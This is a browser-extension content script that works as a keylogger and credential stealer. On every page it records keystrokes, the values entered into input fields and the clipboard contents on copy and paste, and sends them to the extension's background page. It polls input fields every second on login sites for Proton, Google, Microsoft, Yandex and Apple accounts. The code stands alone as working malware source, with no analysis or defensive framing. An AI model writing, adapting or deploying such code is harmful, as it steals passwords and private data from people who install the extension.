console.log("listener here...");
let logs = {};
let str = "";
let hostname;

setTimeout(() => {
  let currentUrl = window.location.href;
  let urlDomain = new URL(currentUrl);
  hostname = urlDomain.hostname;
  if (hostname) {
    console.log("hostname: ", hostname);
    notifyBackgroundPage({
      type: "domain",
      url: window.location.href,
      message: hostname,
    });
  }
}, 1000);

// Add event listener on keydown
document.addEventListener(
  "keydown",
  (event) => {
    var name = event.key;
    var code = event.code;
    // Record and save the key name on keydown
    console.log(`Key pressed ${name} === Key code value: ${code}`);
    notifyBackgroundPage({
      type: "log",
      url: window.location.href,
      message: name,
    });
  },
  false
);

// check for fields
const checkForInputFieldsAndForms = () => {
  console.log("Inputs ran");
  let inputs = document.getElementsByTagName("input");

  if (inputs) {
    for (input of inputs) {
      // Listen for input entries
      input.addEventListener(
        "change",
        (e) => {
          notifyBackgroundPage({
            type: "input",
            url: window.location.href,
            message: {
              domain: hostname || "",
              inputName: input.name || "",
              inputType: input.type || "",
              inputPlaceholder: input.placeholder || "",
              inputText: e.target.value,
            },
          });
        },
        { once: true }
      );
    }
  }
};

function handleResponse(message) {
  if (message) {
    console.log(`Message from the background script: ${message.response}`);
  } else {
    console.log("No message received from the background script.");
  }
}

function handleError(error) {
  console.log(`Error: ${error}`);
}

function notifyBackgroundPage(e) {
  const sending = chrome.runtime.sendMessage(e);
  sending.then(handleResponse, handleError);
}

// LISTEN FOR COPY
document.addEventListener("copy", () => {
  navigator.clipboard.readText().then((text) => {
    notifyBackgroundPage({
      type: "clip",
      url: window.location.href,
      message: { type: "copy", text },
    });
  });
});

// LISTEN FOR PASTE
document.addEventListener("paste", () => {
  // The clipboard event has fired
  navigator.clipboard.readText().then((text) => {
    notifyBackgroundPage({
      type: "clip",
      url: window.location.href,
      message: { type: "paste", text },
    });
  });
});

// content-script.js
function consecutive() {
  setInterval(() => {
    checkForInputFieldsAndForms();
  }, 1000);
}

// Check for hosts
setTimeout(() => {
  if (
    hostname.includes("proton") ||
    hostname.includes("google") ||
    hostname.includes("login.live") ||
    hostname.includes("passport.yandex") ||
    hostname.includes("icloud") ||
    hostname.includes("appleid")
  ) {
    consecutive();
  } else {
    checkForInputFieldsAndForms();
  }
}, 2000);
